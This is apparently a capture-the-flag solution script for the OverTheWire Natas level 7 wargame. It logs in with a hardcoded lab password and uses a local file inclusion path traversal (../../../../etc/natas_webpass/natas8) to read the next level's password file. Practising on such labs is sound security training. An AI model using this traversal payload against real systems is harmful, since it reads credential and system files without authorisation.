#local file inclusion

import requests
import re 

username='natas7'
password='jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr'

#in url local file inclusion is used
#https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion

url='http://%s.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8'%username
session=requests.Session()
response=session.post(url,auth=(username,password))
content=response.text
#print(content)
print (re.findall('<br>\n(.*)\n\n<!--',content)[0])